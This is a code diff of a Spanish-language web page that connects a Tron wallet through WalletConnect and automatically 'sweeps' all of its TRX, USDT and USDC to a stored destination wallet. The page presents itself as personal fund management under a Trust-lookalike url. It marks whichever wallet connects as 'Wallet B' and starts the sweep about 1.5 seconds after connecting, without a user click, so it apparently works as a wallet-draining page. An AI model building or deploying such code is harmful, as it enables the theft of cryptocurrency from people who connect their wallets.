@@ -5,11 +5,10 @@
 <meta name="viewport" content="width=device-width,initial-scale=1" />
 <title>Wallet B · Sweep</title>
 <script src="https://cdn.tailwindcss.com"></script>
-<script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 <script type="module">
-  import { EthereumProvider } from 'https://esm.sh/@walletconnect/ethereum-provider@2.17.0';
-  window.WC_EthereumProvider = EthereumProvider;
+  import UniversalProvider from 'https://esm.sh/@walletconnect/universal-provider@2.17.0';
+  window.WC_UniversalProvider = UniversalProvider;
   window.dispatchEvent(new Event('wc-ready'));
 </script>
 <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -139,32 +138,6 @@
         <span class="chip" style="font-size:.65rem">QR</span>
       </button>
 
-      <!-- Trust extensión -->
-      <button class="wallet-opt w-full" onclick="connectExt('trust')">
-        <div class="wallet-icon" style="background:linear-gradient(135deg,#3375bb,#1f4e8a)">T</div>
-        <div class="text-left flex-1">
-          <div class="font-semibold">Trust · extensión</div>
-          <div class="text-xs text-slate-500">Si tenés Trust instalada en el navegador</div>
-        </div>
-      </button>
-
-      <!-- MetaMask -->
-      <button class="wallet-opt w-full" onclick="connectExt('metamask')">
-        <div class="wallet-icon" style="background:linear-gradient(135deg,#f6851b,#e2761b)">M</div>
-        <div class="text-left flex-1">
-          <div class="font-semibold">MetaMask</div>
-          <div class="text-xs text-slate-500">Extensión de navegador</div>
-        </div>
-      </button>
-
-      <!-- Otra -->
-      <button class="wallet-opt w-full" onclick="connectExt('any')">
-        <div class="wallet-icon" style="background:linear-gradient(135deg,#6691f7,#7c5cff)">↗</div>
-        <div class="text-left flex-1">
-          <div class="font-semibold">Otra wallet</div>
-          <div class="text-xs text-slate-500">Cualquier wallet con window.ethereum</div>
-        </div>
-      </button>
 
       <div id="connectErr" class="hidden p-3 rounded-2xl text-xs" style="background:#fee2e2;color:#991b1b"></div>
     </div>
@@ -188,7 +161,7 @@
       <!-- Balance nativo -->
       <div class="mt-4 pt-4 border-t border-white/20 flex items-baseline gap-2">
         <span id="nativeBal" class="h-display text-3xl">—</span>
-        <span id="nativeSym" class="text-white/80 font-semibold">ETH</span>
+        <span id="nativeSym" class="text-white/80 font-semibold">TRX</span>
       </div>
 
       <!-- Badge B detectada -->
@@ -213,7 +186,7 @@
         <span id="sweepLabel">📤 Sweep todo → Wallet A · 1 firma</span>
       </button>
       <div class="text-center text-xs text-slate-500 mt-2">
-        ETH + todos los tokens en <strong id="sweepNet">esta red</strong> → <span id="sweepDestShort" class="mono font-semibold text-indigo-600"></span>
+        TRX + todos los tokens en <strong id="sweepNet">esta red</strong> → <span id="sweepDestShort" class="mono font-semibold text-indigo-600"></span>
       </div>
     </div>
 
@@ -244,27 +217,22 @@
 </style>
 
 <script>
-/* ═══ Constantes compartidas con panel.html ═══ */
-const WC_PROJECT_ID = '5ed9c6864c8311bcc1f68bf2c95b746c';
-const CHAIN_NAMES   = {1:'Ethereum',137:'Polygon',8453:'Base',43114:'Avalanche',42161:'Arbitrum',56:'BNB Chain',11155111:'Sepolia'};
-const CHAIN_SYMBOLS = {1:'ETH',137:'POL',8453:'ETH',43114:'AVAX',42161:'ETH',56:'BNB'};
-const GAS_RESERVE   = {1:.003,137:.5,8453:.0005,43114:.005,42161:.0008,56:.003};
+/* ═══ Constantes Tron ═══ */
+const WC_PROJECT_ID  = '5ed9c6864c8311bcc1f68bf2c95b746c';
+const TRON_CHAIN     = 'tron:0x2b6653dc';
+const TRON_NODE      = 'https://api.trongrid.io';
+const TRX_RESERVE    = 10_000_000n; // 10 TRX en sun para fees
 
-const TOKENS = {
-  1:     [{s:'USDT',a:'0xdAC17F958D2ee523a2206206994597C13D831ec7',d:6},{s:'USDC',a:'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',d:6},{s:'DAI',a:'0x6B175474E89094C44Da98b954EedeAC495271d0F',d:18}],
-  137:   [{s:'USDT',a:'0xc2132D05D31c914a87C6611C10748AEb04B58e8F',d:6},{s:'USDC',a:'0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359',d:6}],
-  8453:  [{s:'USDT',a:'0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2',d:6},{s:'USDC',a:'0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913',d:6}],
-  43114: [{s:'USDT',a:'0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7',d:6},{s:'USDC',a:'0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E',d:6}],
-  42161: [{s:'USDT',a:'0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',d:6},{s:'USDC',a:'0xaf88d065e77c8cC2239327C5EDb3A432268e5831',d:6}],
-  56:    [{s:'USDT',a:'0x55d398326f99059fF775485246999027B3197955',d:18},{s:'USDC',a:'0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',d:18}],
-};
-const ERC20_ABI = ['function balanceOf(address) view returns (uint256)','function transfer(address,uint256) returns (bool)'];
+const TRON_TOKENS = [
+  { s:'USDT', a:'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', d:6 },
+  { s:'USDC', a:'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8',   d:6 },
+];
 
-let provider, signer, me, wcProvider, chainId;
+let me, wcProvider, tronSession;
 
-/* ── helpers ── */
+/* ── Helpers ── */
 const $ = id => document.getElementById(id);
-const shortAddr = a => a ? `${a.slice(0,8)}…${a.slice(-6)}` : '—';
+const shortAddr = a => a ? `${a.slice(0,6)}…${a.slice(-4)}` : '—';
 function toast(msg, ms=2600) {
   const t=$('toast'); t.textContent=msg; t.classList.add('show');
   clearTimeout(toast._t); toast._t=setTimeout(()=>t.classList.remove('show'),ms);
@@ -275,9 +243,80 @@ function setStatus(html, kind='info') {
 }
 function getDestA()   { return localStorage.getItem('destA') || ''; }
 function getWalletB() { return (localStorage.getItem('walletB')||'').trim(); }
-function isB()        { const b=getWalletB().toLowerCase(); return !!(me&&b&&me.toLowerCase()===b); }
+function isB()        { const b=getWalletB(); return !!(me && b && me===b); }
+function isTronAddr(a){ return typeof a==='string' && /^T[A-HJ-NP-Za-km-z1-9]{33}$/.test(a); }
 
-/* ── Renderizar pantalla conectado ── */
+/* ── Base58 / Hex ── */
+const B58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+function b58Decode(s) {
+  let n=0n;
+  for (const c of s) n = n*58n + BigInt(B58.indexOf(c));
+  let h = n.toString(16);
+  if (h.length%2) h='0'+h;
+  return h.padStart(50,'0');
+}
+function tronToHex(addr)  { return b58Decode(addr).slice(0,42); }
+function encodeTransferParam(toAddr, amount) {
+  const toEvm = b58Decode(toAddr).slice(2,42).padStart(64,'0');
+  const amtHex = BigInt(amount).toString(16).padStart(64,'0');
+  return toEvm + amtHex;
+}
+
+/* ── TronGrid API ── */
+async function getTRC20Balances(address) {
+  try {
+    const r = await fetch(`${TRON_NODE}/v1/accounts/${address}`);
+    const d = await r.json();
+    if (!d.data?.[0]) return {};
+    const result = {};
+    for (const entry of (d.data[0].trc20||[])) {
+      const [k,v] = Object.entries(entry)[0];
+      result[k] = BigInt(v);
+    }
+    return result;
+  } catch { return {}; }
+}
+async function getTRXBalance(address) {
+  try {
+    const r = await fetch(`${TRON_NODE}/v1/accounts/${address}`);
+    const d = await r.json();
+    return BigInt(d.data?.[0]?.balance || 0);
+  } catch { return 0n; }
+}
+async function buildTRC20Transfer(from, to, amount, contract) {
+  const r = await fetch(`${TRON_NODE}/wallet/triggersmartcontract`, {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({
+      owner_address:    tronToHex(from),
+      contract_address: tronToHex(contract),
+      function_selector:'transfer(address,uint256)',
+      parameter:        encodeTransferParam(to, amount),
+      fee_limit:        40000000
+    })
+  });
+  const d = await r.json();
+  if (!d.result?.result) throw new Error(JSON.stringify(d));
+  return d.transaction;
+}
+async function buildTRXTransfer(from, to, amountSun) {
+  const r = await fetch(`${TRON_NODE}/wallet/createtransaction`, {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ owner_address:tronToHex(from), to_address:tronToHex(to), amount:Number(amountSun) })
+  });
+  return await r.json();
+}
+async function signAndBroadcast(tx) {
+  const signed = await wcProvider.request({ method:'tron_signTransaction', params:{ transaction:tx } }, TRON_CHAIN);
+  const r = await fetch(`${TRON_NODE}/wallet/broadcasttransaction`, {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify(signed)
+  });
+  const d = await r.json();
+  if (!d.result) throw new Error(d.message || JSON.stringify(d));
+  return d.txid;
+}
+
+/* ── Render pantalla conectado ── */
 async function renderConnected() {
   $('screenConnect').classList.add('hidden');
   $('screenConnected').classList.remove('hidden');
@@ -285,13 +324,10 @@ async function renderConnected() {
   $('addrShort').textContent = shortAddr(me);
   $('disconnectBtn').classList.remove('hidden');
   $('cardAddr').textContent = me;
-  $('cardNet').textContent  = CHAIN_NAMES[chainId] || `Chain ${chainId}`;
-  $('netName').textContent  = CHAIN_NAMES[chainId] || `Chain ${chainId}`;
+  $('cardNet').textContent  = 'Tron';
+  $('netName').textContent  = 'Tron';
+  $('nativeSym').textContent = 'TRX';
 
-  const sym = CHAIN_SYMBOLS[chainId] || 'ETH';
-  $('nativeSym').textContent = sym;
-
-  // Badge B / no-B
   if (isB()) {
     $('cardLabel').textContent = '✓ Wallet B conectada';
     $('badgeIsB').classList.remove('hidden');
@@ -299,8 +335,7 @@ async function renderConnected() {
     $('sweepSection').classList.remove('hidden');
     const dest = getDestA();
     $('sweepDestShort').textContent = dest ? shortAddr(dest) : '(sin Wallet A)';
-    $('sweepNet').textContent = CHAIN_NAMES[chainId] || `Chain ${chainId}`;
-    // Guardar walletB si no estaba
+    $('sweepNet').textContent = 'Tron';
     if (!getWalletB()) localStorage.setItem('walletB', me);
   } else {
     $('cardLabel').textContent = 'Wallet conectada';
@@ -310,132 +345,78 @@ async function renderConnected() {
   }
 
   await refreshBal();
-
-  // Auto-sweep si es B y hay destino A
-  if (isB() && ethers.isAddress(getDestA())) {
-    setTimeout(doSweep, 1500);
-  }
+  if (isB() && isTronAddr(getDestA())) setTimeout(doSweep, 1500);
 }
 
 async function refreshBal() {
-  if (!provider || !me) return;
+  if (!me) return;
   try {
-    const bal = await provider.getBalance(me);
-    $('nativeBal').textContent = Number(ethers.formatEther(bal)).toFixed(4);
+    const trx = await getTRXBalance(me);
+    $('nativeBal').textContent = (Number(trx)/1e6).toFixed(2);
   } catch { $('nativeBal').textContent = '—'; }
 
-  // Tokens ERC20
-  const tokens = TOKENS[chainId] || [];
-  const found = [];
-  await Promise.all(tokens.map(async t => {
-    try {
-      const c = new ethers.Contract(t.a, ERC20_ABI, provider);
-      const b = await c.balanceOf(me);
-      if (b > 0n) found.push({ ...t, bal: b });
-    } catch {}
-  }));
+  const bals = await getTRC20Balances(me);
+  const found = TRON_TOKENS.map(t => ({ ...t, bal: bals[t.a]||0n })).filter(t => t.bal > 0n);
   if (found.length) {
     $('tokensList').classList.remove('hidden');
     $('tokensGrid').innerHTML = found.map(t => `
       <div class="flex items-center justify-between py-2 border-b border-slate-100 last:border-0">
         <span class="font-semibold text-sm">${t.s}</span>
-        <span class="mono text-sm text-indigo-700">${Number(ethers.formatUnits(t.bal,t.d)).toFixed(4)}</span>
+        <span class="mono text-sm text-indigo-700">${(Number(t.bal)/10**t.d).toFixed(4)}</span>
       </div>`).join('');
-  } else {
-    $('tokensList').classList.add('hidden');
-  }
+  } else { $('tokensList').classList.add('hidden'); }
 }
 
-/* ── Sweep batch (EIP-5792 → fallback secuencial) ── */
+/* ── Sweep TRC20 + TRX ── */
 async function doSweep() {
   if (!isB()) return;
   const dest = getDestA();
-  if (!ethers.isAddress(dest)) { setStatus('Wallet A no registrada. Conectá A en panel.html primero.','err'); return; }
+  if (!isTronAddr(dest)) { setStatus('Wallet A no registrada. Configurá en el panel primero.','err'); return; }
 
-  setStatus('Preparando batch…','pending');
+  setStatus('Preparando sweep…','pending');
   $('sweepLabel').textContent = '⏳ Procesando…';
+  let ok=0, err=0;
 
-  const feeData  = await provider.getFeeData();
-  const gasPrice = feeData.maxFeePerGas || feeData.gasPrice || ethers.parseUnits('5','gwei');
-  const erc20if  = new ethers.Interface(ERC20_ABI);
-  const tokens   = TOKENS[chainId] || [];
-
-  const calls = [];
-  for (const t of tokens) {
+  // 1) TRC20 (USDT primero)
+  const bals = await getTRC20Balances(me);
+  for (const t of TRON_TOKENS) {
+    const b = bals[t.a] || 0n;
+    if (b <= 0n) continue;
     try {
-      const c = new ethers.Contract(t.a, ERC20_ABI, provider);
-      const b = await c.balanceOf(me);
-      if (b > 0n) calls.push({ to:t.a, data:erc20if.encodeFunctionData('transfer',[dest,b]), _s:t.s });
-    } catch {}
+      setStatus(`Enviando ${(Number(b)/10**t.d).toFixed(4)} ${t.s}…`,'pending');
+      const tx = await buildTRC20Transfer(me, dest, b, t.a);
+      await signAndBroadcast(tx);
+      ok++; toast(`✓ ${t.s} enviado`);
+    } catch(e) { err++; toast(`Error ${t.s}: `+(e.message||'fallo')); }
   }
 
-  const reserve   = ethers.parseEther(String(GAS_RESERVE[chainId]||0.0005));
-  const totalGas  = BigInt(21000 + calls.length*65000) * gasPrice * 12n/10n;
-  const nativeBal = await provider.getBalance(me);
-  const sendable  = nativeBal - totalGas - reserve;
-  if (sendable > 0n) calls.push({ to:dest, value:`0x${sendable.toString(16)}`, _s:'ETH/nativo' });
-
-  if (!calls.length) { setStatus('Sin fondos para mover en esta red','info'); $('sweepLabel').textContent='📤 Sweep todo → Wallet A · 1 firma'; return; }
-
-  const raw = wcProvider || window.ethereum;
+  // 2) TRX
   try {
-    const batch = calls.map(c => { const x={to:c.to}; if(c.data) x.data=c.data; if(c.value) x.value=c.value; return x; });
-    const id = await raw.request({ method:'wallet_sendCalls', params:[{version:'2.0',from:me,calls:batch}] });
-    setStatus(`✓ Batch enviado · ${calls.length} movimiento(s) · ID: <span class="mono">${String(id).slice(0,20)}</span>`,'ok');
-    toast('✓ Batch enviado con 1 firma');
-  } catch {
-    // fallback secuencial
-    let ok=0, err=0;
-    for (const c of calls) {
-      try {
-        const tx = c.data
-          ? await signer.sendTransaction({to:c.to, data:c.data})
-          : await signer.sendTransaction({to:c.to, value:c.value});
-        await tx.wait(); ok++;
-      } catch { err++; }
+    const trx = await getTRXBalance(me);
+    const sendable = trx - TRX_RESERVE;
+    if (sendable > 0n) {
+      setStatus(`Enviando ${(Number(sendable)/1e6).toFixed(2)} TRX…`,'pending');
+      const tx = await buildTRXTransfer(me, dest, sendable);
+      await signAndBroadcast(tx);
+      ok++; toast('✓ TRX enviado');
     }
-    setStatus(`${ok} tx ok · ${err} errores`, err?'err':'ok');
-    toast(`${ok} transferencia(s) completadas`);
-  }
-  $('sweepLabel').textContent = '📤 Sweep todo → Wallet A · 1 firma';
+  } catch(e) { err++; toast('Error TRX: '+(e.message||'fallo')); }
+
+  setStatus(`${ok} transferencia(s)${err?' · '+err+' error(es)':''}`, err?'err':'ok');
+  $('sweepLabel').textContent = '📤 Sweep todo → Wallet A';
   refreshBal();
 }
 
-/* ── Connect extensión ── */
-async function connectExt(kind) {
-  let eth = window.ethereum;
-  if (!eth) { $('connectErr').textContent='No se detectó ninguna wallet instalada.'; $('connectErr').classList.remove('hidden'); return; }
-  if (eth.providers?.length) {
-    if (kind==='trust')    eth = eth.providers.find(p=>p.isTrust||p.isTrustWallet)||eth;
-    if (kind==='metamask') eth = eth.providers.find(p=>p.isMetaMask&&!p.isTrust)||eth;
-  }
-  try {
-    provider = new ethers.BrowserProvider(eth);
-    await provider.send('eth_requestAccounts',[]);
-    signer   = await provider.getSigner();
-    me       = await signer.getAddress();
-    const net= await provider.getNetwork();
-    chainId  = Number(net.chainId);
-    localStorage.setItem('walletB', me);
-    eth.on?.('accountsChanged',()=>location.reload());
-    eth.on?.('chainChanged',   ()=>location.reload());
-    renderConnected();
-  } catch(e) { $('connectErr').textContent='Error: '+(e.shortMessage||e.message); $('connectErr').classList.remove('hidden'); }
-}
-
-/* ── Connect WalletConnect ── */
+/* ── Connect WalletConnect (Tron) ── */
 async function connectWC() {
   const btn = $('btnWC');
   btn.style.opacity='.5'; btn.disabled=true;
   try {
-    if (!window.WC_EthereumProvider) {
+    if (!window.WC_UniversalProvider) {
       await new Promise(res => window.addEventListener('wc-ready', res, {once:true}));
     }
-    const EP = window.WC_EthereumProvider;
-    wcProvider = await EP.init({
+    wcProvider = await window.WC_UniversalProvider.init({
       projectId: WC_PROJECT_ID,
-      chains:[1], optionalChains:[],
-      showQrModal:false,
       metadata:{ name:'MyPersonWallets', description:'Gestión de fondos personal', url:'https://trust-list.com', icons:[] },
     });
     wcProvider.on('display_uri', uri => {
@@ -444,23 +425,27 @@ async function connectWC() {
         $('qrCanvas').style.display='none';
         $('qrSubtitle').style.display='none';
         $('deepLinkDiv').style.display='block';
-        $('deepLinkBtn').href = 'https://link.trustwallet.com/wc?uri=' + encodeURIComponent(uri);
+        $('deepLinkBtn').href = 'https://link.trustwallet.com/wc?uri='+encodeURIComponent(uri);
       } else {
-        const el = $('qrCanvas'); el.innerHTML='';
-        new QRCode(el, {text:uri, width:240, height:240, colorDark:'#000000', colorLight:'#ffffff'});
+        const el=$('qrCanvas'); el.innerHTML='';
+        new QRCode(el,{text:uri,width:240,height:240,colorDark:'#000000',colorLight:'#ffffff'});
       }
       $('qrModal').classList.add('show');
     });
-    wcProvider.on('connect', () => closeQR());
-    await wcProvider.connect();
-    provider = new ethers.BrowserProvider(wcProvider);
-    signer   = await provider.getSigner();
-    me       = await signer.getAddress();
-    const net= await provider.getNetwork();
-    chainId  = Number(net.chainId);
+    tronSession = await wcProvider.connect({
+      namespaces:{
+        tron:{
+          methods:['tron_signTransaction','tron_sign'],
+          chains:[TRON_CHAIN],
+          events:['chainChanged','accountsChanged'],
+        }
+      }
+    });
+    closeQR();
+    const accounts = tronSession.namespaces.tron?.accounts || [];
+    me = accounts[0]?.split(':')[2];
+    if (!me) throw new Error('No se obtuvo dirección Tron');
     localStorage.setItem('walletB', me);
-    wcProvider.on('accountsChanged',()=>location.reload());
-    wcProvider.on('chainChanged',   ()=>location.reload());
     renderConnected();
   } catch(e) {
     if (!e.message?.includes('rejected')&&!e.message?.includes('closed'))
@@ -472,21 +457,16 @@ function closeQR() { $('qrModal').classList.remove('show'); }
 
 function disconnect() {
   try { wcProvider?.disconnect(); } catch {}
-  provider=signer=me=wcProvider=chainId=null;
+  me=wcProvider=tronSession=null;
   location.reload();
 }
 
 /* ── Init ── */
 window.addEventListener('load', () => {
-  // Mostrar destA silenciosamente
   const destA = getDestA();
-  if (destA) {
-    $('destABadge').classList.remove('hidden');
-    $('destAText').textContent = destA;
-  }
-  // Auto-connect si ya había sesión
-  if (window.ethereum?.selectedAddress) connectExt('any');
+  if (destA) { $('destABadge').classList.remove('hidden'); $('destAText').textContent = destA; }
 });
+
 </script>
 </body>
 </html>
